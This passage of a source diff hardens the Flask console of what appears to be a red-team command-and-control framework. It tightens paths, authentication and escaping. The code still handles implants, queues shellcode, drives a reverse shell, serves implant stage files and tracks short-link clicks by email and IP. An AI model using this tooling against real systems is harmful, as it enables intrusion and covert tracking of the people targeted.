                 tools.append(tool_data)
 
     karma_name = get_karma_name(current_user.elo)
     connected_hosts = get_discovered_hosts()
 
-    return jsonify({
-        'connected_clients': connected_clients_list,
-        'connected_hosts': connected_hosts,
-        'results': results,
-        'session_data': session_data,
-        'commands_history': commands_history,
-        'os_data': os_data,
-        'pid': pid,
-        'hostname': hostname,
-        'ips': ips,
-        'user': user,
-        'username': USERNAME,
-        'password': PASSWORD,
-        'c2_route': route_maleable,
-        'win_useragent': win_useragent_maleable,
-        'lin_useragent': lin_useragent_maleable,
-        'implants': implants,
-        'directories': directories,
-        'tasks': tasks,
-        'bot': response_bot,
-        'event_config': event_config,
-        'config': {
-            'enable_c2_debug': config.enable_c2_debug
-        },
-        'tools': tools,
-        'current_user_id': current_user.id,
-        'elo': current_user.elo,
-        'prompt': prompt,
-        'local_ips': local_ips,
-        'discovered_ips': discovered_ips,
-        'result_portscan': result_portscan,
-        'result_pwd': result_pwd,
-        'short_urls': short_urls,
-        'c2_port': lport,
-        'karma_name': karma_name,
-        'is_authenticated': current_user.is_authenticated,
-        'current_user_username': current_user.username
-    })
+    try:
+        from modules.killchain import KillChain as _KC
 
-@app.route('/create_short_url', methods=['POST'])
+        killchain_snapshot = _KC.snapshot()
+    except Exception:
+        killchain_snapshot = {
+            "current_phase": "recon",
+            "completed_phases": [],
+            "progress": [],
+            "host_states": {},
+            "compact": "",
+            "updated_at": "",
+        }
+
+    beacon_records: dict[str, list[dict]] = {}
+    for cid in connected_clients_list:
+        records = _read_beacon_records(cid)
+        if records:
+            beacon_records[str(cid)] = records
+        elif str(cid) in results:
+            beacon_records[str(cid)] = [results[str(cid)]]
+
+    return jsonify(
+        {
+            "connected_clients": connected_clients_list,
+            "connected_hosts": connected_hosts,
+            "results": results,
+            "beacon_records": beacon_records,
+            "killchain": killchain_snapshot,
+            "current_phase": killchain_snapshot.get("current_phase", "recon"),
+            "session_data": session_data,
+            "commands_history": commands_history,
+            "os_data": os_data,
+            "pid": pid,
+            "hostname": hostname,
+            "ips": ips,
+            "user": user,
+            "username": USERNAME,
+            "password": PASSWORD,
+            "c2_route": route_malleable,
+            "win_useragent": win_useragent_malleable,
+            "lin_useragent": lin_useragent_malleable,
+            "implants": implants,
+            "directories": directories,
+            "tasks": tasks,
+            "bot": response_bot,
+            "event_config": event_config,
+            "config": {"enable_c2_debug": config.enable_c2_debug},
+            "tools": tools,
+            "current_user_id": current_user.id,
+            "elo": current_user.elo,
+            "prompt": prompt,
+            "local_ips": local_ips,
+            "discovered_ips": discovered_ips,
+            "result_portscan": result_portscan,
+            "result_pwd": result_pwd,
+            "short_urls": short_urls,
+            "c2_port": lport,
+            "karma_name": karma_name,
+            "is_authenticated": current_user.is_authenticated,
+            "current_user_username": current_user.username,
+        }
+    )
+
+
+@app.route("/create_short_url", methods=["POST"])
 @requires_auth
 def create_short_url():
     """Create multiple short URLs for a single original URL."""
     data = request.get_json()
     if not data:
         logging.warning("No JSON data received in create_short_url")
-        return jsonify({'error': 'No data provided'}), 400
-    original_url = data.get('original_url')
-    custom_short_url = data.get('custom_short_url')
-    count = data.get('count', 1)
+        return jsonify({"error": "No data provided"}), 400
+    original_url = data.get("original_url")
+    custom_short_url = data.get("custom_short_url")
+    count = data.get("count", 1)
     if not original_url:
         logging.warning("No original_url provided")
-        return jsonify({'error': 'Original URL is required'}), 400
+        return jsonify({"error": "Original URL is required"}), 400
     if not is_valid_url(original_url):
-        return jsonify({'error': 'Invalid URL or file path.'}), 400
+        return jsonify({"error": "Invalid URL or file path."}), 400
     short_urls = load_short_urls()
     generated_urls = []
     for _ in range(count):
         short_url = custom_short_url if custom_short_url and not generated_urls else secrets.token_urlsafe(6)
         if short_url in short_urls:
             continue
-        short_urls[short_url] = {
-            'original_url': original_url,
-            'active': True,
-            'created_at': datetime.now().isoformat()
-        }
+        short_urls[short_url] = {"original_url": original_url, "active": True, "created_at": datetime.now().isoformat()}
         generated_urls.append(short_url)
     save_short_urls(short_urls)
     logging.info(f"Created short URLs: {generated_urls} -> {original_url}")
-    return jsonify({'short_urls': generated_urls})
+    return jsonify({"short_urls": generated_urls})
 
-@app.route('/track/<short_url>', methods=['GET'])
+
+@app.route("/track/<short_url>", methods=["GET"])
 def track_interaction(short_url):
     """Serve tracking page and log behavioral data."""
     short_urls = load_short_urls()
-    if short_url not in short_urls or not short_urls[short_url]['active']:
+    if short_url not in short_urls or not short_urls[short_url]["active"]:
         logging.warning(f"Short URL not found or inactive: {short_url}")
         abort(404)
     client_ip = request.remote_addr
-    user_agent = request.headers.get('User-Agent')
-    behavior_data = request.args.get('behavior', '{}')
-    email = request.args.get('email', 'unknown')
+    user_agent = request.headers.get("User-Agent")
+    behavior_data = request.args.get("behavior", "{}")
+    email = request.args.get("email", "unknown")
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
     cursor.execute(
-        'INSERT INTO behavioral_tracking (campaign_id, short_url, email, event_type, ip, user_agent, timestamp, behavior_data) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
-        ('unknown', short_url, email, 'click', client_ip, user_agent, datetime.now().isoformat(), behavior_data)
+        "INSERT INTO behavioral_tracking (campaign_id, short_url, email, event_type, ip, user_agent, timestamp, behavior_data) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+        ("unknown", short_url, email, "click", client_ip, user_agent, datetime.now().isoformat(), behavior_data),
     )
     conn.commit()
     conn.close()
-    return render_template('tracking_page.html', short_url=short_url, original_url=short_urls[short_url]['original_url'])
+    return render_template(
+        "tracking_page.html", short_url=short_url, original_url=short_urls[short_url]["original_url"]
+    )
 
-@app.route('/update_short_url/<short_url>', methods=['PUT'])
+
+@app.route("/update_short_url/<short_url>", methods=["PUT"])
 @requires_auth
 def update_short_url(short_url):
     try:
         data = request.get_json()
-        new_original_url = data.get('original_url')
-        active = data.get('active')
+        new_original_url = data.get("original_url")
+        active = data.get("active")
 
         if new_original_url and not is_valid_url(new_original_url):
-            return jsonify({'error': 'Invalid URL format'}), 400
+            return jsonify({"error": "Invalid URL format"}), 400
 
         short_urls = load_short_urls()
         if short_url not in short_urls:
-            return jsonify({'error': 'Short URL not found'}), 404
+            return jsonify({"error": "Short URL not found"}), 404
 
         if new_original_url:
-            short_urls[short_url]['original_url'] = new_original_url
+            short_urls[short_url]["original_url"] = new_original_url
         if active is not None:
-            short_urls[short_url]['active'] = active
+            short_urls[short_url]["active"] = active
 
         save_short_urls(short_urls)
         logging.info(f"Updated short URL: {short_url}")
-        return jsonify({'message': 'Updated successfully'})
-    except Exception as e:
+        return jsonify({"message": "Updated successfully"})
+    except Exception:
         logging.error(f"Error in update_short_url: {str('')}")
-        return jsonify({'error': f"Internal server error: {str('')}"}), 500
+        return jsonify({"error": f"Internal server error: {str('')}"}), 500
 
-@app.route('/<short_url>')
+
+@app.route("/<short_url>")
 def redirect_to_file(short_url):
     try:
         short_urls = load_short_urls()
-        if short_url not in short_urls or not short_urls[short_url]['active']:
+        if short_url not in short_urls or not short_urls[short_url]["active"]:
             logging.warning(f"Short URL not found or inactive: {short_url}")
             abort(404)
-        original_url = short_urls[short_url]['original_url']
+        original_url = short_urls[short_url]["original_url"]
         client_ip = request.remote_addr
-        user_agent = request.headers.get('User-Agent')
+        user_agent = request.headers.get("User-Agent")
         logging.info(f"Short URL {short_url} accessed by {client_ip} with {user_agent}")
         parsed_url = urlparse(original_url)
-        if parsed_url.scheme == 'file' or not parsed_url.scheme:
-            file_path = parsed_url.path if parsed_url.scheme == 'file' else original_url
-            file_path = os.path.abspath(file_path)
-            if os.path.exists(file_path) and os.path.isfile(file_path):
+        if parsed_url.scheme == "file" or not parsed_url.scheme:
+            file_path = _resolve_contained_file_path(original_url, Path(SESSIONS_DIR))
+            if file_path is not None and file_path.is_file():
                 return send_file(file_path)
-            else:
-                logging.warning(f"File not found: {file_path}")
-                abort(404)
+            logging.warning("Short URL file target not found or outside sessions dir")
+            abort(404)
         return redirect(original_url)
-    except Exception as e:
+    except HTTPException:
+        raise
+    except Exception:
         logging.error(f"Error in redirect_to_file: {str('')}")
-        return jsonify({'error': f"Internal server error: {str('')}"}), 500
+        return jsonify({"error": f"Internal server error: {str('')}"}), 500
 
-@app.route('/webserver-report')
-@app.route('/webserver-report/<path:filename>')
+
+@app.route("/webserver-report")
+@app.route("/webserver-report/<path:filename>")
 @requires_auth
-def webserver_report(filename='index2.html'):
+def webserver_report(filename="index2.html"):
     """Serve nmap HTML report assets from the sessions directory over HTTPS.
 
     All untrusted path components are resolved through
@@ -3381,15 +4868,22 @@ def webserver_report(filename='index2.html'):
         abort(404, description="File not found")
     return send_from_directory(resolver.base_dir, relative)
 
-@app.route('/s/<filename>')
+
+@app.route("/s/<filename>")
 def download_files(filename):
-    """Serve a session file by name, enforcing strict basename containment."""
+    """Serve implant stage files by name, enforcing strict containment.
+
+    Only files explicitly registered in the operator-controlled short URL
+    registry (implant delivery) or the fixed implant stage names are
+    served. Captured credentials, hashes, loot and other session files are
+    never exposed through this unauthenticated route.
+    """
     access_denied = "Access denied or invalid file"
     if not filename or not isinstance(filename, str):
         abort(403, description=access_denied)
-    if '/' in filename or '\\' in filename or '\x00' in filename:
+    if "/" in filename or "\\" in filename or "\x00" in filename:
         abort(403, description=access_denied)
-    if filename in ('.', '..'):
+    if filename in (".", ".."):
         abort(403, description=access_denied)
 
     sanitized = secure_filename(filename)
@@ -3407,69 +4901,120 @@ def download_files(filename):
     except ValueError:
         abort(403, description=access_denied)
 
-    file_extension = safe_filename.rsplit('.', 1)[-1].lower() if '.' in safe_filename else ''
-    is_allowed_extension = file_extension in ALLOWED_EXTENSIONS
-
     is_existing_file = os.path.isfile(candidate_real)
-    is_binary_file = is_binary(safe_filename) if is_existing_file else False
 
     short_urls = load_short_urls()
     for _short_url, data in short_urls.items():
-        if not data.get('active', False):
+        if not data.get("active", False):
             continue
-        parsed_url = urlparse(data['original_url'])
+        parsed_url = urlparse(data["original_url"])
         original_filename = os.path.basename(parsed_url.path)
         if safe_filename == original_filename:
             if is_existing_file:
                 return send_from_directory(sessions_real, safe_filename)
             abort(404, description="File not found")
 
-    if is_existing_file and (is_allowed_extension or is_binary_file):
+    if safe_filename in IMPLANT_STAGE_FILES and is_existing_file:
         return send_from_directory(sessions_real, safe_filename)
 
     abort(403, description=access_denied)
 
-@app.route('/view_yaml', methods=['POST'])
+
+@app.route("/view_yaml", methods=["POST"])
 @requires_auth
 def view_yaml():
     response = decoy()
     if response:
         return response
-    selected_directory = request.form.get('directory')
+    selected_directory = request.form.get("directory")
     if not selected_directory:
-        return redirect(url_for('index'))
+        return redirect(url_for("index"))
 
-    # Prevent path traversal
-    if not selected_directory or '..' in selected_directory or selected_directory.startswith('/'):
-        return jsonify({'error': 'Invalid directory'}), 400
-    selected_path = os.path.normpath(os.path.join(atomic_framework_path, selected_directory))
-    atomic_abs = os.path.normpath(os.path.abspath(str(atomic_framework_path)))
-    selected_abs = os.path.normpath(os.path.abspath(str(selected_path)))
-    if not selected_abs.startswith(atomic_abs + os.sep) and selected_abs != atomic_abs:
-        return jsonify({'error': 'Access denied'}), 403
+    raw = str(selected_directory or "")
+    if len(raw) > _YAML_VIEW_DIR_MAX_LENGTH or not _is_safe_dir_path(raw):
+        return jsonify({"error": "Invalid directory"}), 400
+    try:
+        atomic_abs = os.path.realpath(os.path.abspath(str(atomic_framework_path)))
+        selected_abs = _safe_join_under(atomic_abs, raw)
+    except (ValueError, Exception):
+        return jsonify({"error": "Access denied"}), 403
+    if not os.path.isdir(selected_abs):
+        return jsonify({"error": "Invalid directory"}), 400
 
     yaml_data = []
+    seen_files = 0
+    try:
+        for root, dirs, files in os.walk(selected_abs, followlinks=False):
+            try:
+                if os.path.commonpath([atomic_abs, os.path.realpath(root)]) != atomic_abs:
+                    dirs[:] = []
+                    continue
+                if os.path.commonpath([selected_abs, os.path.realpath(root)]) != selected_abs:
+                    dirs[:] = []
+                    continue
+            except ValueError:
+                dirs[:] = []
+                continue
+            dirs[:] = [d for d in dirs if d not in (".", "..") and not d.startswith(".")]
+            dirs.sort()
+            if len(files) > _YAML_VIEW_MAX_FILES:
+                files = sorted(files)[:_YAML_VIEW_MAX_FILES]
+            for name in sorted(files):
+                if not _is_safe_yaml_name(name):
+                    continue
+                candidate = os.path.realpath(os.path.join(root, name))
+                try:
+                    if os.path.commonpath([atomic_abs, candidate]) != atomic_abs:
+                        continue
+                    if os.path.commonpath([selected_abs, candidate]) != selected_abs:
+                        continue
+                except ValueError:
+                    continue
+                if not os.path.isfile(candidate):
+                    continue
+                try:
+                    if os.path.getsize(candidate) > _YAML_VIEW_MAX_BYTES:
+                        continue
+                except OSError:
+                    continue
+                seen_files += 1
+                if seen_files > _YAML_VIEW_MAX_FILES or len(yaml_data) >= _YAML_VIEW_MAX_TESTS:
+                    break
+                try:
+                    with open(candidate, "r", encoding="utf-8", errors="replace") as handle:
+                        data = yaml.safe_load(handle)
+                except (OSError, yaml.YAMLError, UnicodeError):
+                    continue
+                if not isinstance(data, dict):
+                    continue
+                tests = data.get("atomic_tests", [])
+                if not isinstance(tests, list):
+                    continue
+                for test in tests[:_YAML_VIEW_TESTS_PER_FILE]:
+                    if len(yaml_data) >= _YAML_VIEW_MAX_TESTS:
+                        break
+                    if not isinstance(test, dict):
+                        continue
+                    description = test.get("description") or ""
+                    yaml_data.append(
+                        {
+                            "auto_generated_guid": test.get("auto_generated_guid"),
+                            "name": escape_js_string(test.get("name")),
+                            "description": escape_js_string(str(description).replace("\n", "<br>")),
+                            "supported_platforms": test.get("supported_platforms"),
+                        }
+                    )
+            if seen_files > _YAML_VIEW_MAX_FILES or len(yaml_data) >= _YAML_VIEW_MAX_TESTS:
+                break
+    except OSError:
+        return jsonify({"error": "Unable to read directory"}), 500
 
-    for root, dirs, files in os.walk(selected_path):
-        for file in files:
-            if file.endswith('.yaml'):
-                yaml_file_path = os.path.join(root, file)
-                with open(yaml_file_path, 'r') as file:
-                    data = yaml.safe_load(file)
-                    for test in data.get('atomic_tests', []):
-                        yaml_data.append({
-                            'auto_generated_guid': test.get('auto_generated_guid'),
-                            'name': escape_js_string(test.get('name')),
-                            'description': escape_js_string(test.get('description').replace('\n','<br>')),
-                            'supported_platforms': test.get('supported_platforms')
-                        })
-
-    return render_template('yaml_view.html', yaml_data=yaml_data, directory=selected_directory)
+    return render_template("yaml_view.html", yaml_data=yaml_data, directory=raw)
 
 
-
-@app.route('/api/run', methods=['POST'])
+@app.route("/api/run", methods=["POST"])
 @requires_auth
+@csrf_protect
 @limiter.limit("30 per minute")
 def run_command():
     """Execute one shell command and return a sanitised, JSON-safe result.
@@ -3480,43 +5025,74 @@ def run_command():
     exception escaping the shell invocation is converted into a generic
     error so internal class names, stack traces and file paths never
     reach the caller.
+
+    In addition the command must clear :class:`CommandAllowlist`; the
+    first whitespace-delimited token must be on the configured list and
+    no shell metacharacter is permitted anywhere in the payload. The
+    decision (allowed or denied) is appended to the audit log.
     """
     generic_error = _security_config.generic_command_error_message
     try:
         data = request.get_json(silent=True)
         if not isinstance(data, dict):
             return jsonify({"error": "Invalid request body"}), 400
-        command = data.get('command')
+        command = data.get("command")
         if not isinstance(command, str) or not command.strip():
             return jsonify({"error": "No command provided"}), 400
+        decision = _command_allowlist.check(command)
+        if not decision.allowed:
+            return jsonify(
+                {
+                    "error": "command not allowed",
+                    "reason": decision.reason.value if decision.reason else "unknown",
+                }
+            ), 403
         try:
             output = shell.one_cmd(command)
         except BaseException:
             logger.exception("Shell invocation failed for one_cmd")
             return jsonify({"error": generic_error}), 500
-        if config.enable_c2_debug == True:
+        if config.enable_c2_debug:
             logger.info(f"[INFO] Type of output: {type(output).__name__}")
         if isinstance(output, BaseException):
-            logger.error(
-                "Command output was an exception: %s", type(output).__name__
-            )
+            logger.error("Command output was an exception: %s", type(output).__name__)
             return jsonify({"error": generic_error}), 500
         serializable_output = _sanitize_command_output(output)
+        try:
+            from modules.event_bus import EventCategory, LazyEvent, get_event_bus
+
+            parts = command.strip().split(None, 1)
+            cmd_name = parts[0] if parts else command
+            get_event_bus().publish(
+                LazyEvent(
+                    category=EventCategory.COMMAND,
+                    event_type=cmd_name,
+                    source="c2_api",
+                    payload={
+                        "command": command,
+                        "output_snippet": str(serializable_output)[:500],
+                    },
+                    target=config.rhost if hasattr(config, "rhost") else "",
+                )
+            )
+        except Exception:
+            pass
         return jsonify({"result": serializable_output}), 200
     except BaseException:
         logger.exception("Unhandled error in /api/run")
         return jsonify({"error": generic_error}), 500
 
-@app.route('/api/output', methods=['GET'])
+
+@app.route("/api/output", methods=["GET"])
 @requires_auth
 def get_output():
     global shell
     output = shell.output
-    if config.enable_c2_debug == True:
+    if config.enable_c2_debug:
         logger.info(f"[INFO] Type of output: {type(output)}")
 
     if isinstance(output, BaseException):
-        logger.error(f"Shell output was an exception: {output}")
+        logger.error("Shell output was an exception: %s", type(output).__name__)
         return jsonify({"error": "Command execution error"}), 500
     elif isinstance(output, str):
         serializable_output = output
@@ -3533,23 +5109,119 @@ def get_output():
 
     return jsonify({"output": serializable_output})
 
-@app.route('/run_shellcode', methods=['POST'])
+
+@app.route("/run_shellcode", methods=["POST"])
 @requires_auth
 def run_shellcode():
-    client_id = request.form['client_id']
-    shellcode = request.form['shellcode']
+    client_id = request.form["client_id"]
+    shellcode = request.form["shellcode"]
     commands[client_id] = f"sc:{shellcode}"
-    return redirect(url_for('index'))
+    return redirect(url_for("index"))
 
-@app.route('/get_results', methods=['GET'])
+
+@app.route("/get_results", methods=["GET"])
 @requires_auth
 def get_results():
     return jsonify(results)
 
-@app.route('/lazyos/<ip>/<port>', methods=['POST'])
+
+_REVERSE_SHELL_PASSWORD_CACHE: str = ""
+
+
+def _seal_reverse_shell_password(plaintext: str) -> str:
+    """Seal a reverse-shell password for storage (delegates to vault contract).
+
+    Args:
+        plaintext: Generated fallback password.
+
+    Returns:
+        Sealed value when sealing resolves, else plaintext.
+    """
+    from core.reverse_shell_secret import seal_reverse_shell_password as _seal
+
+    return _seal(plaintext)
+
+
+def _load_reverse_shell_password(secret_path: str) -> str:
+    """Load a persisted reverse-shell password (delegates to vault contract).
+
+    Args:
+        secret_path: Path of the persisted fallback secret.
+
+    Returns:
+        Stored password, or empty string when unreadable.
+    """
+    from core.reverse_shell_secret import load_reverse_shell_password as _load
+
+    return _load(secret_path)
+
+
+def _resolve_reverse_shell_password() -> str:
+    """Return the password used to authenticate to the /lazyos reverse shell.
+
+    When ``c2_reverse_shell_password`` is configured and meets the minimum
+    length, that value is used. Otherwise a cryptographically random
+    32-byte hex token is generated once per process lifetime, persisted
+    sealed (AES-256-GCM via the credential vault, owner-only 0600) under
+    ``sessions/.reverse_shell_password`` for the authenticated operator,
+    and never written to logs. A previously persisted fallback is reused
+    so operator sessions survive restarts.
+
+    Returns:
+        The active reverse-shell authentication password.
+    """
+    global _REVERSE_SHELL_PASSWORD_CACHE
+    from core.reverse_shell_secret import (
+        REVERSE_SHELL_PASSWORD_MIN_LENGTH as _PASSWORD_MIN_LENGTH,
+    )
+    from core.reverse_shell_secret import (
+        REVERSE_SHELL_SECRET_FILENAME as _SECRET_FILENAME,
+    )
+    from core.reverse_shell_secret import (
+        generate_reverse_shell_password as _generate_password,
+    )
+
+    candidate = str(getattr(config, "c2_reverse_shell_password", "") or "").strip()
+    is_valid, _ = _validate_password_length(candidate)
+    if candidate and is_valid:
+        return candidate
+    if _REVERSE_SHELL_PASSWORD_CACHE:
+        return _REVERSE_SHELL_PASSWORD_CACHE
+    sessions_dir = SESSIONS_DIR if isinstance(SESSIONS_DIR, str) else str(SESSIONS_DIR)
+    secret_path = os.path.join(sessions_dir, _SECRET_FILENAME)
+    try:
+        reused = _load_reverse_shell_password(secret_path)
+        if reused:
+            _REVERSE_SHELL_PASSWORD_CACHE = reused
+            return _REVERSE_SHELL_PASSWORD_CACHE
+    except Exception:
+        pass
+    _REVERSE_SHELL_PASSWORD_CACHE = _generate_password()
+    try:
+        _store_secret_owner_only(secret_path, _seal_reverse_shell_password(_REVERSE_SHELL_PASSWORD_CACHE) + "\n")
+        logger.warning(
+            "[c2] c2_reverse_shell_password missing or too short (minimum %d chars). "
+            "Auto-generated fallback stored sealed owner-only at %s. "
+            "Set c2_reverse_shell_password in payload.json to silence this warning.",
+            _PASSWORD_MIN_LENGTH,
+            secret_path,
+        )
+    except OSError as exc:
+        logger.warning(
+            "[c2] c2_reverse_shell_password missing or too short (minimum %d chars). "
+            "Auto-generated fallback kept in memory only (persist failed). "
+            "Set c2_reverse_shell_password in payload.json to silence this warning.",
+            _PASSWORD_MIN_LENGTH,
+        )
+        logger.debug("reverse-shell fallback persist failed: %s", type(exc).__name__)
+    return _REVERSE_SHELL_PASSWORD_CACHE
+
+
+@app.route("/lazyos/<ip>/<port>", methods=["POST"])
 @requires_auth
 def send_lcommand(ip, port):
     import ipaddress as _ipaddress
+
     try:
         _ipaddress.ip_address(ip)
     except ValueError:
@@ -3561,11 +5233,8 @@ def send_lcommand(ip, port):
     except (ValueError, TypeError):
         return jsonify({"error": "Invalid port"}), 400
     try:
-        command = request.json.get('command')
-        reverse_shell_password = getattr(config, 'c2_reverse_shell_password', None) or config.c2_pass
-        if not reverse_shell_password or len(reverse_shell_password) < 8:
-            reverse_shell_password = "grisiscomebacksayknokknok"
-        password = reverse_shell_password
+        command = request.json.get("command")
+        password = _resolve_reverse_shell_password()
         if not command:
             return jsonify({"error": "No command provided"}), 400
 
@@ -3577,40 +5246,48 @@ def send_lcommand(ip, port):
             response = s.recv(1024).decode()
 
         return jsonify({"response": response})
-    except Exception as e:
+    except Exception:
         return jsonify({"error": str("audio")}), 500
 
-@app.route('/chatbot', methods=['POST'])
+
+@app.route("/chatbot", methods=["POST"])
+@login_required
 def chatbot():
+    response = decoy()
+    if response:
+        return response
     data = request.json
-    prompt = data.get('prompt')
-    debug = data.get('debug', False)
+    prompt = data.get("prompt")
+    debug = data.get("debug", False)
     if not prompt:
         return jsonify({"error": "Insert Prompt"}), 400
 
     response = process_prompt(client, prompt, debug)
     return jsonify({"response": response})
 
-@app.route('/vuln', methods=['POST'])
+
+@app.route("/vuln", methods=["POST"])
+@login_required
 def vuln():
+    response = decoy()
+    if response:
+        return response
     global events
     data = request.json
     file = f"{path}/sessions/vulns_{rhost}.nmap"
-    debug = data.get('debug', True)
-    event_view = data.get('event_view', "")
+    debug = data.get("debug", True)
+    event_view = data.get("event_view", "")
 
     event_config = load_event_config()
-    if config.enable_c2_debug == True:
+    if config.enable_c2_debug:
         logger.info(events)
 
-    response = {
-        "events": events
-    }
+    response = {"events": events}
 
     for event in event_config["events"]:
         event_key = event["name"]
         src_path = event["src_path"].format(BASE_DIR=BASE_DIR, rhost=rhost)
-        size = event["size"]
+        event["size"]
         if event_view == event_key:
             current_src_path = src_path
         else:
@@ -3620,89 +5297,120 @@ def vuln():
     if not file:
         return jsonify({"error": "run lazynmap before"}), 400
 
-
     response = process_prompt_vuln(client, file, debug, event_view)
-    with open(f"{BASE_DIR}/plan.txt", 'w') as f:
-       f.write(response)
-       f.close()
-    shell.onecmd('create_session_json')
+    with open(f"{BASE_DIR}/plan.txt", "w") as f:
+        f.write(response)
+        f.close()
+    shell.onecmd("create_session_json")
     return jsonify({"response": response})
 
-@app.route('/taskbot', methods=['POST'])
+
+@app.route("/taskbot", methods=["POST"])
+@login_required
 def taskbot():
+    response = decoy()
+    if response:
+        return response
     data = request.json
     file = f"{path}/sessions/tasks.json"
-    debug = data.get('debug', True)
+    debug = data.get("debug", True)
     if not file:
         return jsonify({"error": "El file es requerido"}), 400
     response = process_prompt_task(client, file, debug)
 
     return jsonify({"response": response})
 
-@app.route('/search', methods=['POST'])
+
+@app.route("/search", methods=["POST"])
+@login_required
 def search():
+    response = decoy()
+    if response:
+        return response
     data = request.json
-    prompt = data.get('prompt')
-    debug = data.get('debug', False)
+    prompt = data.get("prompt")
+    debug = data.get("debug", False)
     if not prompt:
         return jsonify({"error": "Insert Prompt"}), 400
 
     response = process_prompt_search(client, prompt, debug)
     return jsonify({"response": response})
 
-@app.route('/script', methods=['POST'])
+
+@app.route("/script", methods=["POST"])
+@login_required
 def script():
+    response = decoy()
+    if response:
+        return response
     data = request.json
-    prompt = data.get('prompt')
-    debug = data.get('debug', False)
+    prompt = data.get("prompt")
+    debug = data.get("debug", False)
     if not prompt:
         return jsonify({"error": "Insert Prompt"}), 400
 
     response = process_prompt_script(client, prompt, debug)
     return jsonify({"response": response})
 
-@app.route('/redop', methods=['POST'])
+
+@app.route("/redop", methods=["POST"])
+@login_required
 def redop():
+    response = decoy()
+    if response:
+        return response
     data = request.json
     file = f"{path}/sessions/sessionLazyOwn.json"
-    debug = data.get('debug', True)
+    debug = data.get("debug", True)
     if not file:
         return jsonify({"error": "El file es requerido"}), 400
     response = process_prompt_redop(client, file, debug)
-    with open(f"{BASE_DIR}/status_redop.txt", 'w') as f:
-       f.write(response)
-       f.close()
-    shell.onecmd('create_session_json')
+    with open(f"{BASE_DIR}/status_redop.txt", "w") as f:
+        f.write(response)
+        f.close()
+    shell.onecmd("create_session_json")
     return jsonify({"response": response})
 
-@app.route('/adversary', methods=['POST'])
+
+@app.route("/adversary", methods=["POST"])
+@login_required
 def adversary():
+    response = decoy()
+    if response:
+        return response
     data = request.json
-    prompt = data.get('prompt')
-    debug = data.get('debug', False)
+    prompt = data.get("prompt")
+    debug = data.get("debug", False)
     if not prompt:
         return jsonify({"error": "Insert Prompt"}), 400
 
     response = process_prompt_adversary(client, prompt, debug)
     return jsonify({"response": response})
 
-@app.route('/generalbot', methods=['POST'])
+
+@app.route("/generalbot", methods=["POST"])
+@login_required
 def generalbot():
+    response = decoy()
+    if response:
+        return response
     data = request.json
-    prompt = data.get('prompt')
-    debug = data.get('debug', False)
+    prompt = data.get("prompt")
+    debug = data.get("debug", False)
     if not prompt:
         return jsonify({"error": "Insert Prompt"}), 400
 
     response = process_prompt_general(client, prompt, debug)
     return jsonify({"response": response})
 
-@app.route('/csv_to_html', methods=['POST'])
+
+@app.route("/csv_to_html", methods=["POST"])
+@login_required
 def csv_to_html():
     response = decoy()
     if response:
         return response
-    file_path = request.json.get('file_path')
+    file_path = request.json.get("file_path")
     if not file_path:
         return jsonify({"error": "No file path provided"}), 400
 
@@ -3713,55 +5421,54 @@ def csv_to_html():
     sanitized_file_path = os.path.normpath(file_path)
     sanitized_file_path = os.path.realpath(sanitized_file_path)
 
-
     allowed_directory_realpath = os.path.realpath(ALLOWED_DIRECTORY)
     if not sanitized_file_path.startswith(allowed_directory_realpath):
         return jsonify({"error": "Invalid file path"}), 403
 
-
     relative_path = os.path.relpath(sanitized_file_path, allowed_directory_realpath)
 
-    if '..' in relative_path or relative_path.startswith('/'):
+    if ".." in relative_path or relative_path.startswith("/"):
         return jsonify({"error": "Invalid file path"}), 403
 
     full_path = os.path.join(allowed_directory_realpath, relative_path)
 
-
-
     try:
-        with open(full_path, 'r') as file:
+        with open(full_path, "r") as file:
             reader = csv.reader(file)
             headers = next(reader)
             rows = list(reader)
 
             html = '<table border="1"><tr>'
-            html += ''.join(f'<th>{header}</th>' for header in headers)
-            html += '</tr>'
+            html += "".join(f"<th>{html.escape(header)}</th>" for header in headers)
+            html += "</tr>"
 
             for row in rows:
-                html += '<tr>'
-                html += ''.join(f'<td>{cell}</td>' for cell in row)
-                html += '</tr>'
+                html += "<tr>"
+                html += "".join(f"<td>{html.escape(cell)}</td>" for cell in row)
+                html += "</tr>"
 
-            html += '</table>'
+            html += "</table>"
 
             return html
 
-    except Exception as e:
-        return jsonify({"error": str("audio")}), 500
+    except Exception:
+        return jsonify({"error": "Failed to parse CSV file"}), 500
 
-@app.route('/search_results', methods=['POST'])
+
+@app.route("/search_results", methods=["POST"])
+@login_required
 def search_results():
     response = decoy()
     if response:
         return response
 
-    term = request.form.get('input')
+    term = request.form.get("input")
     if not term:
-        return render_template_string(
-            render_template('header2.html') + 
-            "# Error\n- **Please enter a search term.**\n" +
-            render_template('footer.html')
+        return Response(
+            render_template("header2.html")
+            + "# Error\n- **Please enter a search term.**\n"
+            + render_template("footer.html"),
+            mimetype="text/html",
         )
 
     # Lista de todos los archivos Parquet a buscar
@@ -3770,7 +5477,7 @@ def search_results():
         "parquets/detalles.parquet",
         "parquets/binarios.parquet",
         "parquets/lolbas_index.parquet",
-        "parquets/lolbas_details.parquet"
+        "parquets/lolbas_details.parquet",
     ]
 
     # Búsqueda en todos los archivos
@@ -3784,37 +5491,44 @@ def search_results():
             print(f"[!] Error searching {path}: {e}")
 
     if not combined_md_content.strip():
-        combined_md_content = f"No Results found for: '{term}'\n"
+        combined_md_content = f"No Results found for: '{html.escape(term)}'\n"
 
     # Convertir a HTML
     html_content = markdown.markdown(combined_md_content)
 
     # Renderizar plantillas
-    headers_content = render_template('header2.html')
-    footer = render_template('footer.html')
+    headers_content = render_template("header2.html")
+    footer = render_template("footer.html")
 
-    return render_template_string(headers_content + html_content + footer)
-@app.route('/graph')
+    return Response(headers_content + html_content + footer, mimetype="text/html")
+
+
+@app.route("/graph")
+@requires_auth_or_session
 def graph():
     response = decoy()
     if response:
         return response
-    return render_template('graph.html')
+    return render_template("graph.html")
 
-@app.route('/task/<int:task_id>')
+
+@app.route("/task/<int:task_id>")
+@requires_auth_or_session
 def task(task_id):
     response = decoy()
     if response:
         return response
     tasks = load_tasks()
-    task = next((t for t in tasks if t['id'] == task_id), None)
+    task = next((t for t in tasks if t["id"] == task_id), None)
     if not task:
-        flash('Task not found!', 'danger')
-        return redirect(url_for('index'))
-    task_description = markdown.markdown(task['description'])
-    return render_template('task.html', task=task, task_description=task_description)
+        flash("Task not found!", "danger")
+        return redirect(url_for("index"))
+    task_description = markdown.markdown(task["description"])
